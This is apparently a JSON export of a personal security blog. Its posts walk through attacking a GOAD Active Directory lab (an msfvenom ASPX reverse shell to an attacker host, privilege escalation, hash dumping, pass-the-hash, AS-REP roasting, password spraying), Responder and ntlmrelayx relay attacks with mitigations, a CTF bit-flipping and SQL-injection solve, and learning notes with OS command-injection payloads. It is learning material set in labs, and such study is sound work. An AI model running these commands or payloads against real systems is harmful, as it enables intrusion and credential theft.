[{"content":"Description\rIn this writeup, I\u0026rsquo;m going to be going through my exploitation process with GOAD. This process was through my own investigation. I noticed the Castelblack machine was very insecure. It even had a file upload page when you visited the IP on a browser. I will go into how I exploited this and then gained higher privileges on the machine.\nEnvironments Used\rGOAD Kali Utilities Used\rnmap metasploit msfvenom PrinterSpoofer evil-winrm sharphound bloodhound crackmapexec Impacket-GetNPUsers hashcat Project Walkthrough\rReconnaissance\rWhen I first started attacking the environment, I scanned the network with nmap. This gave me an idea of the services I would be encountering.\nI tried to connect through SMB on all of the machines, but the only one with anything exposed was the Castelblack machine. I figured this was a good starting point. Here is the nmap scan for Castelblack.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2025-01-20T20:46:29 |_Not valid after: 2055-01-20T20:46:29 | ms-sql-info: | 192.168.74.22:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 | ms-sql-ntlm-info: | 192.168.74.22:1433: | Target_Name: NORTH | NetBIOS_Domain_Name: NORTH | NetBIOS_Computer_Name: CASTELBLACK | DNS_Domain_Name: north.sevenkingdoms.local | DNS_Computer_Name: castelblack.north.sevenkingdoms.local | DNS_Tree_Name: sevenkingdoms.local |_ Product_Version: 10.0.17763 |_ssl-date: 2025-01-20T22:45:06+00:00; 0s from scanner time. 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=castelblack.north.sevenkingdoms.local | Not valid before: 2025-01-19T20:13:27 |_Not valid after: 2025-07-21T20:13:27 |_ssl-date: 2025-01-20T22:45:06+00:00; 0s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_ssl-date: 2025-01-20T22:45:06+00:00; 0s from scanner time. |_http-title: Not Found | ssl-cert: Subject: commonName=VAGRANT | Subject Alternative Name: DNS:VAGRANT, DNS:vagrant | Not valid before: 2025-01-19T11:21:16 |_Not valid after: 2028-01-19T11:21:16 | tls-alpn: |_ http/1.1 MAC Address: 00:0C:29:E4:82:DD (VMware) Device type: general purpose Running: Microsoft Windows 2019 OS CPE: cpe:/o:microsoft:windows_server_2019 OS details: Microsoft Windows Server 2019 Network Distance: 1 hop Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_nbstat: NetBIOS name: CASTELBLACK, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:0c:29:e4:82:dd (VMware) | smb2-time: | date: 2025-01-20T22:45:01 |_ start_date: N/A The machine seems to have a web page that can be visited, so I went to the IP in my brower.\nI clicked the link, and there was a file upload tool that told you where the files were being uploaded to. This was a clear way to get shell.\nWeaponizing\rI used msfvenom to craft a .aspx reverse shell. There are a variety of ways this can be done and payloads you can use. Initially, I used just a basic shell and listened for it with netcat. However, metasploit has a multi/handler tool that can be used to spawn meterpreter sessions, which give you a lot more wiggle room.\nTo craft the exploit for this, you need to do the following msfvenom command:\n1 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=\u0026lt;attackerip\u0026gt; LPORT=4444 -f aspx -o shell.aspx The port can be whatever you want, and it\u0026rsquo;s typically best to avoid 4444 in a real situation as it is typically quickly picked up since it\u0026rsquo;s the default for metasploit.\nNow, once you upload the generated payload to the file upload page, you can visit /uploads/shell.aspx while you have metasploit listening, and you should get a session.\nMake sure to do the following commands to get metasploit set up to catch the shell:\n1 2 3 4 5 6 msfconsole use multi/handler set payload windows/x64/meterpreter_reverse_tcp set lhost \u0026lt;attackerip\u0026gt; set lport \u0026lt;portyouset\u0026gt; run Exploitation\rNow you can visit the shell uploaded, and a meterpreter session should spawn after a bit.\nThe reason I went this route is there is a variety of things you can do with a meterpreter shell. Specifically, it makes it much easier to upload and download files. You can also spawn into a normal shell this way and then back out of it to use meterpreter commands.\nFrom here there are a variety of routes you can take. First, it\u0026rsquo;s best to elevate privileges. If you check the user you spawn as and their privileges, you will see an interesting one:\nYou\u0026rsquo;ll see that you have the SeImpersonatePrivilege enabled. The two attacks that can exploit this are the JuicyPotato and PrinterSpoofer attacks.The JuicyPotato attack won\u0026rsquo;t work with this machine as it\u0026rsquo;s a Windows Server 2019 machine, so I went with PrinterSpoofer.\nYou can do this manually by uploading the PrinterSpoofer64.exe to the box and running the following command:\n1 PrintSpoofer.exe -i -c cmd This should spawn an elevated shell.\nWith meterpreter, all you need to do is go back into the meterpreter shell and type getsystem and it will elevate you to nt authority.\nFrom here, you should be able to just type hashdump into the meterpreter window, and all the user hashes should drop:\nFrom here, you can spawn a shell using evil-winrm with the Administrator hash.\nEvil-winrm is good in the same way that meterpreter is helpful as it allows you to easily upload and download files. This can be useful when trying to get domain information using SharpHound to exfiltrate the zip that is generated.\nI was having trouble doing this through Evil-WinRM, so we\u0026rsquo;ll move over to meterpreter with the nt authority privileges and attempt to run SharpHound that way.\nAnd from here you can use meterpreter to download the zip file.\nBloodHound\rOne great thing I like using BloodHound for is getting the users in the domain. You can also see what groups they\u0026rsquo;re a part of and ways you may be able to exploit their privileges.\nThe author of GOAD has a good tutorial on gathering users other ways, but those did not work for me, so going this route was much easier for me, especially with the Castelblack box being so vulnerable. You can view his walkthrough here.\nFor me, I did the following query in BloodHound to view all the users.\n1 MATCH (u:User) RETURN u And this was the result.\nFrom here, you can make a list of users. These we will use to test for credentials. In the GOAD guide, his methods of collecting user credentials were very useful.\nCredential Gathering\rFirst, I made a list containing all the users we\u0026rsquo;ve captured.\nYou can also click through all the users in BloodHound and look at their privileges. Particularly, sometimes users will leave credentials in their descriptions. We find this with the samwell.tarly user.\nWe can also check usernames as passwords.\n1 crackmapexec smb 192.168.74.11 -u users.txt -p users.txt --no-bruteforce --continue-on-success Another way to get credentials that was suggested in the guide was to use GetNPUsers.\n1 impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile aspreroastables.txt -dc-ip 192.168.74.11 \u0026#39;north.sevenkingdoms.local/\u0026#39; This command generates a .txt file called \u0026lsquo;aspreroastables.txt\u0026rsquo; which you can run through hashcat to try and crack.\n1 hashcat -m 18200 aspreroastables.txt /usr/share/wordlists/rockyou.txt We now should have four credentials:\nYou can also perform a password spray with the users and passwords you\u0026rsquo;ve collected, but it looks like the passwords only match up with the people we found them for.\n1 crackmapexec smb 192.168.74.11 -u users.txt -p passwords.txt --continue-on-success Sources\rhttps://blog.compass-security.com/2020/07/make-the-most-out-of-bloodhound/ https://mayfly277.github.io/posts/GOADv2-pwning-part2/ https://github.com/itm4n/PrintSpoofer Conclusion\rThis was just the first part of my exploration through Active Directory utilizing GOAD. In the coming writeups, I will be exploring getting into the other machines and moving around in the environment further.\nPlease leave a comment if you have any recommendations on things I could improve, or any thoughts on the process. Thank you for reading!\n","date":"2025-01-21T00:00:00Z","image":"http://localhost:1313/blog/p/active-directory-part-2-exploring-goad-environment/image9_hu9883142330492519084.png","permalink":"http://localhost:1313/blog/p/active-directory-part-2-exploring-goad-environment/","title":"Active Directory Part 2 - Exploring GOAD Environment"},{"content":"Description\rWe will be going over the process of getting the Game Of Active Directory set up on a Windows device. I am going to be using VMWare workstation for this.\nEnvironment\rVMWare Workstation Windows 11 - Host machine Kali GOAD What You Need\rYou will need Python \u0026gt;=3.8 installed on your device. You can install Python here. You will also need pip installed, which we will do coming up here shortly.\nFirst, make sure you have plenty of space on your drive. I am just setting up the light version of GOAD, but you still need a good amount of space and RAM to get it set up properly.\nNext, we will be cloning the directory here.\n1 git clone https://github.com/Orange-Cyberdefense/GOAD The documentation is very useful, and they have a section on Windows, but I will be going over some differences in what their walkthrough does that I ran into. You can find that documentation here.\nYou will have to install pip using the following commands:\n1 2 curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python get-pip.py Setup and Install\rFrom here, you will need go into the GOAD directory you just cloned and install the noansible_requirements.yml file using pip. The way that they show in the documentation didn\u0026rsquo;t work for me, so I did the following:\n1 python -m pip install -r noansible_requirements.yml Once this runs, you should be able to run the goad.py file like this:\n1 python goad.py -m vm And you should get the following screen:\nFrom here, in the command prompt that spawns, you want to set a few things. I personally set the lab to GOAD-Light and set the IP range to 192.168.74. You can change those the following ways:\n1 2 3 set_lab \u0026lt;lab\u0026gt; # GOAD/GOAD-Light/NHA/SCCM set_ip_range \u0026lt;ip-range\u0026gt; # you only need to specify the first three digits like 192.168.56 install # will finalize your settings If you are fine with the default range of 192.168.56, don\u0026rsquo;t worry about changing the IP range. The most important thing is specifying the type of lab you want to build.\nPossible Issues\rWhen installing, I ran into an error that is pretty common.\n1 2 [-] 3 fails abort. [-] Something wrong during the provisioning task : build.yml What helped me was assigning an IP to my machine for the adaptor that was being used for the machines. I go over later on how to figure out which adaptor is the one your lab is using. You can skip the the \u0026ldquo;Getting Kali Configured\u0026rdquo; section to see how I did that and then come back here.\nTo get to the adaptors, you need to go to the Control Panel in your host machine and go to \u0026ldquo;Network and Internet.\u0026rdquo;\nYou then want to go to \u0026ldquo;Network and Sharing Center.\u0026rdquo;\nAnd then you\u0026rsquo;ll want to click \u0026ldquo;Change adaptor settings.\u0026rdquo;\nThen you want to right click the adaptor you need to configure and select properties. A window will pop up where you will want to go down to \u0026ldquo;Internet Protocol Version 4.\u0026rdquo; From here you will select \u0026ldquo;Properties.\u0026rdquo;\nFrom here, you will edit the configuration similarly to what I have below depending on your IP range you set.\nI also made the DNS server Google\u0026rsquo;s DNS server just to ensure name resolution. This seemed to also fix an issue I was having with internet connection.\nThis fix was suggested by a user on github named \u0026rsquo;theiosif\u0026rsquo; which you can find here.\nThe installation will take quite a while, so it\u0026rsquo;s best to just leave it running while it does its thing.\nGetting Kali Configured\rTo get Kali to be able to communicate with all the machines on the network, you need to add the adaptor to the machine.\nFirst, you need to find what adaptor is hosting the IP range you specified. To do that you can go to \u0026ldquo;Edit\u0026rdquo; and then \u0026ldquo;Virtual Network Editor\u0026rdquo;.\nYou can see here I have multiple adaptors, but the one with the range \u0026ldquo;192.168.74.0\u0026rdquo; is the one I need to connect to. That would be VMnet1.\nNext you want to right click on the Kali box in VMWare and click \u0026ldquo;Settings\u0026rdquo;. From here, you can edit the adaptor.\nWhere I have highlighted in red, you should have set and selected the VMnet adaptor that corresponds to the one for your GOAD network.\nAfter saving these settings and booting into Kali, you may have to set a static IP for the box. To do this, click the upper left corner Kali menu and search \u0026ldquo;Network\u0026rdquo;.\nClick the \u0026ldquo;Advanced Network Configuration\u0026rdquo; option. This will open up your network configurations, where you want to click on the Wired Connection and click the gear icon.\nYou then want to click into the IPv4 settings window, and add your IP address within the range of your lab. I also just set the DNS to 8.8.8.8 for good measure and to prevent any name resolution issues.\nFrom here, I just ran netdiscover -r 192.168.74.0/24 to find all the IPs on the range. You can then go ahead and ping the IPs to check connectivity. If you did the GOAD-Light lab like I did, four of these should return with responses. Those are your lab machines.\nConclusion\rI hope this helped a bit with getting GOAD set up on Windows! I had a lot of issues getting it set up for a while, so I wanted to make a guide to make it easier in case anyone else runs into the same problems.\nPlease let me know in the comments if there\u0026rsquo;s anything I could add or clarify and make better! Thank you for reading.\nSources\rhttps://github.com/Orange-Cyberdefense/GOAD https://phoenixnap.com/kb/install-pip-windows https://orange-cyberdefense.github.io/GOAD/ https://github.com/Orange-Cyberdefense/GOAD/issues/281 ","date":"2025-01-20T00:00:00Z","image":"http://localhost:1313/blog/p/setting-up-goad-on-windows/image_hu3524175165721689272.png","permalink":"http://localhost:1313/blog/p/setting-up-goad-on-windows/","title":"Setting Up GOAD On Windows"},{"content":"Description\rThis project goes over the process of attacking an Active Directory environment. Remediation process for each attack are suggested as well.\nUtilities Used\rresponder hashcat impacket evil-winrm Environment Used\rVMWare Workstation Microsoft Windows Server 2022 Standard x2 Microsoft Windows 10 Enterprise Kali Linux with PimpMyKali Project Walkthrough\rSetup\rYou must have an Active Directory Domain Controller and Windows 10 workstations set up in a particular way for these attacks to work properly. You can either follow this YouTube video for instructions, or go through TCM Academy’s Practical Ethical Hacking course for proper instructions to get set up.\nI also installed a Kali Linux machine that the attacks will be coming from. To ensure that you have everything communicating, make sure to change the NIC to NAT for all devices in the lab.\nI also installed PimpMyKali onto the Kali box to add some extra features that will be used.\nThe tools you will need present on your Kali box are:\nresponder hashcat impacket evil-winrm Attacks\rNR Spoofing Leading to SMB Credential Access\rThis is the most basic attack that can be performed with responder out of box. Essentially, all you need to do is run responder and wait for someone to attempt to connect to a non-existent SMB share.\nYou are essentially exploiting the broadcast performed between NBT-NS (NetBIOS Name Service), LLMNR (Link-Local Multicast Name Resolution), and mDNS (multicast DNS) by spoofing responses to their queries, tricking the victim into trusting the malicious server.\nBecause we have control over the workstations, we can simulate this event ourselves. This attack will cause the NTLMv2 hashes to be dumped, which we can take and crack.\n1 responder -I eth0 -dP -v Once you run responder, you need to go over to your Windows 10 workstation and attempt to access a fake SMB share.\nThis should drop the NTLMv2 hash of the user who attempted the connection onto your Kali box with the listening responder tool.\nFrom here, you can put the hash into a text file and use hashcat to attempt to crack the password.\n1 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt Remediation/Mitigation\rDisable LLMNR Disable NBT-NS Enable SMB Signing Enforce Stronger Password Policies Sources\rTCM Academy Practical Ethical Hacking course CYNET - LLMNR \u0026amp; NBT-NS Poisoning and Credential Access using Responder SMB Relay Using Impacket-ntlmrelayx And Responder\rThis attack can be performed utilizing both impacket-ntlmrelayx and responder in conjunction. It\u0026rsquo;s very similar to the NR spoofing attack, but allows us to relay the captured NTLM hash and authenticate as that user. This can allow us to dump SAM hashes or gain shell access.\nFor this attack to work, there needs to be multiple machines with SMB signing disabled. Make sure to include all of the machines in a target.txt file, or else the attack will not work [1]\nYou can test to see if SMB signing is enabled but not required by executing the following command:\n1 nmap --script=smb2-security-mode.nse -p445 \u0026lt;ip\u0026gt; You can also specify a range of IPs and scan for multiple vulnerable workstations.\nOnce you have all of the vulnerable workstations in a text document, you need to first run responder:\n1 responder -I eth0 -dP -v And then execute the following command:\n1 impacket-ntlmrelayx -tf targets.txt -smb2support This will dump the SAM hashes of all users on the machine.\nYou should also be able to use ntlmrelayx to open smb shells on the machine. If you do the following command:\n1 impacket-ntlmrelayx -tf targets.txt -smb2support -i And then netcat into the session spawned. You will be able to access the machine through SMB.\nTheoretically, this can then be used to perform a PtH attack utilizing something like evil-winrm. However, for this to work with evil-winrm, you need to configure your Windows Remote Management settings.\nThe command would look something like this:\n1 evil-winrm -i \u0026lt;ip\u0026gt; -u \u0026#39;administrator\u0026#39; -H \u0026lt;hash\u0026gt; Remediation/Mitigation\rEnable SMB Signing on all devices Utilize account tiering Local admin restriction Sources\rWhat Is SMB Relay? How It Works \u0026amp; Examples SMB Relay Attacks and How to Prevent Them in Active Directory Conclusion\rHere I\u0026rsquo;ve shown just two very basic attacks that can be performed on an Active Directory environment. Later on, I will show some other attacks utilizing ldapdomaindump, ldapsearch, bloodhound, crackmapexec, netexec and more. There are a variety of attacks the AD is vulnerable to, here is just an intro.\nI will also show an example of utilizing evil-winrm practically and how you can use this tool to your advantage when exploiting an environment.\nFor now, NR Spoofing and SMB Relay attacks are two very common attacks that are often discussed when exploring exploiting Active Directory. These are typically the first couple things one should try when testing an environment, as you can quickly get credentials this way.\n","date":"2025-01-17T00:00:00Z","image":"http://localhost:1313/blog/p/attacking-active-directory-with-responder-and-ntlmrelayx/image1_hu7078685944499902527.png","permalink":"http://localhost:1313/blog/p/attacking-active-directory-with-responder-and-ntlmrelayx/","title":"Attacking Active Directory With Responder and NTLMrelayX"},{"content":"Getting Things Set Up\rFirst, I made sure that Burp Suite was booted and was intercepting traffic from the website. This was to capture the requests required to perform the attack, and send the proper request to get the flag.\nBurp Suite intercepting traffic from the website.\nOnce I got that set up, I needed to create an account on the website.\nFrom there, I went to the \u0026ldquo;secure\u0026rdquo; file storage system and uploaded a file with the name iijiijiijflag.txt .\nGathering The Info\rOnce it\u0026rsquo;s uploaded, I downloaded the file and looked at the intercepted download request. This request was sent to the repeater. From there, I changed the request to a post request, added the content type, and made sure that the file content displayed in the response.\nFrom there, I copied the created post request and saved it into a text document.\nI then took that text document and passed it through sqlmap using the command sqlmap -r request.txt --dump --batch --where \u0026quot;id=\u0026lt;file_id\u0026gt;\u0026quot; --threads 10 -T file where \u0026lt;file_id\u0026gt; is the file I uploaded, which I got at the end of the intercepted download request. This gave me the database entry of the file I uploaded.\nI made sure to take note of the user_id, filename , and filepath as those are what are going to be input into the sql injection.\nBit Flipping\rFrom there, I wrote a script that bit flipped the encrypted filename into the intended filename. What I wanted to do was to change what we uploaded when it is decrypted so that the system interpreted it as the flag.txt in the root folder of the system.\nThis is the script I made to perform the bit flip:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 def bitFlip( posList, bit, data): raw = base64.b64decode(data) #decodes base64 list1 = list(raw) #seperates bytes into list #looping through list for pos in posList: list1[pos] = list1[pos] ^ bit #xors the char to the right char raw = bytes(list1) #turns list1 back into bytes object return base64.b64encode(bytes(raw)) #turns raw into byte object and encodes back to base64 bit1 = ord(\u0026#39;i\u0026#39;) ^ ord(\u0026#39;.\u0026#39;) #gets the xor of \u0026#39;i\u0026#39; and \u0026#39;.\u0026#39; bit2 = ord(\u0026#39;/\u0026#39;) ^ ord(\u0026#39;j\u0026#39;) #gets the xor of \u0026#39;/\u0026#39; and \u0026#39;j\u0026#39; cipher = \u0026lt;filename\u0026gt; #Encrypted file name gathered cipher = bitFlip([0,1,3,4,6,7],bit1,cipher) #Here you will specify the index of each \u0026#39;i\u0026#39; cipher = bitFlip([2,5,8],bit2,cipher) #Here you will specify the index of each \u0026#39;j\u0026#39; print(f\u0026#34;Bit flipped: {cipher}\u0026#34;) Running this with the encrypted filename I got output xP/sqUK6OqhSI+n65oYx0mSvvL57l57WoVfkClXUhQARzaxGRqXg0CrUbsaA9phT\nSQL Injection\rFrom there, I created an sql injection that I injected into the /api/files/download endpoint, which was going to hopefully give me the proper flag.txt file I was trying to get.\nFor the sql injection, I did the following query: UNION SELECT 1,user_id,title,filename,filepath , and with all of the proper values in place, the request looked something like: UNION SELECT 1,130,'getflag','xP/sqUK6OqhSI+n65oYx0mSvvL57l57WoVfkClXUhQARzaxGRqXg0CrUbsaA9phT','b+YXVpogrJoGsjPTdQQTud0kMiX7I2ei8BATNwKpXGhtZuRYnT0vJbcMkK7PoZuk' with the final query looking like what’s shown below once everything was properly encoded.\nAnd once I sent that request, I got the flag!\n","date":"2025-01-17T00:00:00Z","image":"http://localhost:1313/blog/p/secure-file-storage/Untitled-1_hu14807338092764340421.png","permalink":"http://localhost:1313/blog/p/secure-file-storage/","title":"Secure File Storage"},{"content":" This is just some notes I took while going through the Bug Bounty course in Hack The Box Academy. I figured I would post it in case it would help others learn.\nApologies if it seems everywhere! I didn\u0026rsquo;t go through and clean anything up :3\nHyperText Transfer Protocol (HTTP)\rFully Qualified Domain Name (FQDN) - essentially the domain name of the website Uniform Resource Locator - this includes the FQDN as well as different parts like the top-layer domain, subdomain, query string, and fragment.\nThere are different parts of a URL Scheme - this is like http:// or https:// User info - this would sometimes be a part of the url, but not always. It looks like admin:password@ and then the main domain name. Host - this includes the domain name and sub domain. It looks like hackthebox.com Port - sometimes included, but not always necessary. Will look like :80 after the host. Path - this immediately follows either the host or the port if the port is specified. Looks like /dashboard.php Query String - this is also sometimes included if needed to look up something. Will look like ?login=true or similar Fragments - this is to specify a section within the main resource. Will look something like #status\nHTTP Flow User -\u0026gt; DNS -\u0026gt; IP DNS sends IP -\u0026gt; User User -\u0026gt; Send HTTP Request to IP/Web Server IP/Web server -\u0026gt; Send HTTP Response to User\nBasically, the user requests the IP of the domain specified to the Domain Name Server. The DNS sends the IP of the web server to the User. The User then sends an HTTP or HTTPS request to that IP address. That web server at that IP address sends back an HTTP or HTTPS response. Request: GET /HTTP/1.1 Response: HTTP/1.1 200 OK\nSide Note Typically, on a Linux system, the browser will first look in /etc/hosts to find the IP address associated with the domain name. You can use this to specify domain names for IP addresses that don\u0026rsquo;t necessarily have one assigned with a DNS. HTB wants this to be done quite a bit :)\ncURL This is a really important command, as you can send HTTP requests and see the response in terminal. You can also do stuff like getting the index.html file that is rendered when you first request the main website. You can do this using the -O flag in curl. You can also use the -o flag to specify just a general output file.\nCalling the index.html file for say hackthebox.com would look like curl -O hackthebox.com/index.html, and you should have created a copy of that domain\u0026rsquo;s index.html file that\u0026rsquo;s been requested. You can also do the -s flag to silence the status and the -O flag in conjunction to just straight grab the index.html file without the status.\nHyperText Transfer Protocol Secure (HTTPS)\rOne drawback to HTTP is that it sends everything over plaintext, which is pretty dangerous. This is why HTTPS was created. It utilizes TLS/SSL to encrypt traffic sent over the protocol. This even includes login credentials if they aren\u0026rsquo;t hashed client-side.\nIf someone intercepts HTTPS traffic, they won\u0026rsquo;t be able to see the data within that request. You can tell if a website is using HTTPS as it will have https:// in the beginning of the URL. Most browsers will also warn you now before you visit a website only using HTTP.\nHTTPS is where the three-way-handshake is employed. This is to make sure that the communication is secure and stable before transferring any information between the client and host. There are different response codes depending on the status of the requested page as well.\ncURL For HTTPS Using curl with HTTPS, there might be an issue where there will be an SSL Certificate problem saying that the certificate is invalid. To bypass this, when you are doing the cURL command, you can add on the -k flag to the curl command.\nHTTP Requests and Responses\rHTTP requests and responses are structured in particular ways that are consistent. The send request information will cause certain responses, so they must be formatted correctly to get the intended response back. Browsers will craft these automatically.\nHTTP Request In a request, there are three main aspects of the header. There will be the method, path, and version. The method will be something like GET, POST, DELETE, and more. There are a lot of different kinds of methods.\nThe path was somewhat covered earlier, but generally will look like /index.html if you\u0026rsquo;re calling that particular file. The path is whatever resource you are requesting. The version is the version of HTTP being used.\nFollowing these, there tend to be a lot more parameters, but the important thing for now is those main three request parts.\nHTTP Response With this, in the first line, there are two main fields returned. That will be the HTTP version, and the response code. The response code denotes what ended up happening with the request. Typically, a 200 OK response means that the page was returned successfully. Something like a 404 ERROR response will be that the page doesn\u0026rsquo;t exist.\nAgain, there will be a lot more perameters in the header, but these two are the main things to pay attention to.\ncURL Utilizing the -v flag will show what is send more clearly. You can also use -vvv, which will increase verbosity, or the information you are shown about the exchange.\nBrowser DevTools Basically, we\u0026rsquo;re talking about inspect element. I typically like using the FireFox DevTools as you can much more easily edit requests right there in the toolkit. For Chrom or FireFox, you can press CTRL+SHIFT+I or click F12 to pull up the toolkit.\nYou\u0026rsquo;ll mainly want to focus on the Network tab to grab files being transferred and requests being performed. Here is where you\u0026rsquo;ll be able to find the requests to alter. You can apparently use the Filter to filter out and search certain requests if a website loads too many to parse through.\nHTTP Headers\rSince we didn\u0026rsquo;t discuss them before, they\u0026rsquo;re covered here thankfully (somewhat). We\u0026rsquo;re going to go over a few different kinds of headers that you\u0026rsquo;ll typically encounter. There are general, entity, response, request, and security headers.\nFor general headers, you\u0026rsquo;ll either encounter the date, or the connection status. The date is well, the date. The connection status will either be close or keep-alive. It will commonly look like Connection: close or Connection: keep-alive.\nFor entity headers, there are quite a few. There\u0026rsquo;s content-type, media-type, boundary, content-length, and content-encoding. The content-type specifies the kind of content accepted. The media-type defines the data that\u0026rsquo;s being transferred. The boundary acts as a marker to seperate content.\nThe content length contains the size of what\u0026rsquo;s being passed. The content-encoding defines the kinds of transformations the data goes through. This means that, if the data being transferred is large, it will denote that the content-encoding was compressed, and what kind of compression was used.\n","date":"2024-07-21T17:51:00Z","image":"http://localhost:1313/blog/p/htb-bug-bounty-http-fundamentals/hack-the-box-e1694085620820_hu11550969931739292403.png","permalink":"http://localhost:1313/blog/p/htb-bug-bounty-http-fundamentals/","title":"HTB Bug Bounty - HTTP Fundamentals"},{"content":" This took a while for me to get through. I kept working on small sections at a time but wanted enough content for a post before I posted. So, although it says, \u0026ldquo;Day Three\u0026rdquo;, it\u0026rsquo;s more like day 6 or 7.\nIn this post, we\u0026rsquo;re going to be covering part of the API Testing module. This is all about utilizing API on web apps to force changes to be made to content on the website, or potentially leak valuable information.\nAPI Recon\rBasically, you need to figure out as much as you can about the API. This starts with finding endpoints that can be interacted with.\nNext, you need to determine how to interact with the API. This means determining some of the following:\nWhat data does the API process? What types of requests does the API accept? What are the rate limits and authentication methods API Documentation\rAnother good place for recon is API documentation. It is there for developers to get a better understanding of how to utilize the API but can provide helpful information on the functionality of the API that might lead to possible exploitations.\nIf you are having trouble finding it publicly available, you may be able to crawl websites that use it and find the documentation there. Finding endpoints like /api, /swagger/index.md, or /openapi.json.\nIf you find an endpoint, make sure you investigate the base path. For example, if you find the endpoint /api, you should explore all endpoints branching from there.\nThis might be something like /api/swagger or /api/swagger/v1 etc.\nLab\rThis lab was straight forward you just had to go to /api and utilize the DELETE tool from the tool kit present there.\nIdentifying and Interacting with API Endpoints\rIdentifying\rThis section starts off with finding and identifying API endpoints. You\u0026rsquo;d do this by essentially just crawling applications that use the API. While doing this, you would want to look for patterns that suggest API endpoints such as /api/.\nYou want to keep an eye out for JavaScript files particularly. These can contain calls to API endpoints that you may not have triggered yet. Burp Scanner automatically extracts some endpoints while its craws, but for more in-depth extraction, you can use JS Link Finder BApp, or you can manually review the JavaScript files.\nInteracting\rTo interact with API endpoints, you want to use Burp Repeater and Burp Intruder. These will allow you to observe the APIs behavior based on changes you make information sent to the API. This could be like observing what happens when you change the HTTP method and media type.\nYou want to keep an eye out for error messages while you do this as it could point in the direction of a valid request, which you could build and use to exploit the API.\nIdentifying Supported HTTP Methods\rThis section basically just goes over the different HTTP methods. So GET retrieves resources, PATCH applies partial changes to resources, and OPTIONS gets information on the types of requests that can be used on resources.\nAPI endpoints may support other methods such as GET, POST, and DELETE. Burp Intruder has a list to automatically cycle through methods.\nIdentifying Supported Content Types\rYou can exploit APIs by changing the content type. To change the type, you can change the Content-Type header. You can use the Content Type converter BApp which converts data automatically between XML and JSON.\nLab\rHere, we must buy the jacket item for free. I can see that there\u0026rsquo;s an API endpoint at /api/products/1/price. The only methods allowed are GET and PATCH. The GET method outputs the price and message for the item.\nMy assumption is that PATCH needs to be used somehow, but PATCH outputs a message saying \u0026ldquo;Unauthorized\u0026rdquo;. I think maybe I must reformat the PATCH request.\nYou basically had to use the BApp Content Type Converter to utilize the PATCH method. You had to put in {\u0026quot;price\u0026quot;: 0} to get the API to change the price of the jacket to \u0026ldquo;$0.00\u0026rdquo;.\nUsing Intruder To Find Hidden Endpoints\rYou can utilize known endpoints to find other hidden endpoints. You can use Burp Repeater to parse through different common endpoint names and find possible hidden endpoints that could be exploited.\nFinding Hidden Parameters\rIt\u0026rsquo;s possible to find hidden undocumented API parameters that can be exploited. These can be used to change application behavior. Burp has a few tools to help find hidden API parameters.\nBurp Intruder can be used to parse through common parameter names. You should also include potential parameter names based on API recon. You can also use the Param Miner BApp to iterate through possible parameters. The Content discovery tool can help to find hidden content, including possible parameters. This was all for this section. Although these are going to be labeled in order by \u0026ldquo;Days\u0026rdquo;, they aren\u0026rsquo;t really going to be just individual days. Each section might be a combination of multiple days of study.\nThis information has been valuable to learn in my opinion. I hadn\u0026rsquo;t ever considered exploiting API on a website, but now that I\u0026rsquo;ve done it, I get the idea behind it.\nIn the next post, we will continue exploiting websites utilizing API. I\u0026rsquo;m looking forward to learning more about this topic, and I hope you\u0026rsquo;re enjoying following along!\n","date":"2024-05-15T00:00:00Z","image":"http://localhost:1313/blog/p/portswigger-academy-day-three/portswigger-03_hu4642186354899659523.jpg","permalink":"http://localhost:1313/blog/p/portswigger-academy-day-three/","title":"Portswigger Academy Day Three"},{"content":" Today is my second day going through the PortSwigger Academy learning paths! We\u0026rsquo;re continuing with the Server-side Vulnerabilities pathway, where we will finish up with OS Command Injection and SQL Injection.\nOS Command Injection\rThis is a shell attack that allows the execution of OS commands, which can be used to fully compromise a system running the application at hand.\nIt also gives an avenue for potentially changing internal permissions, allowing for higher privileges within the system than you may have initially been able to gain access to.\nUseful Commands\rHere are some useful commands to execute to help identify there being an OS command injection vulnerability:\nPurpose of command Linux Windows Name of current user whoami whoami Operating system uname -a ver Network configuration ifconfig ipconfig /all Network connections netstat -an netstat -an Running processes ps -ef tasklist Injecting OS Commands\rBeing able to execute these is like an SQL injection. In the URL, often a parameter will be established to be set to an input variable.\nYou can exploit this by doing something like \u0026amp; echo aiwefwlguh \u0026amp; which will make the system execute the echo command and echo the specified string.\nThis is a good way to test if OS Command Injection is a possible vulnerability that can be exploited.\nOS Command Injection, Simple Case\rThis lab had us do something that wasn\u0026rsquo;t shown in the instructions beforehand. Rather than doing something like \u0026amp; whoami \u0026amp;, the lab wanted the input to be | whoami put after the input storeID.\nI\u0026rsquo;m assuming they wanted us to look up other ways to do the injection, but it\u0026rsquo;s kind of weird they show one way to do the injection method, but have us physically do a different method.\nAnyway, the result looked like productId=1\u0026amp;storeId=1 | whoami which outputs the name of the user.\nSQL Injection\rI referred to this earlier because I\u0026rsquo;m relatively 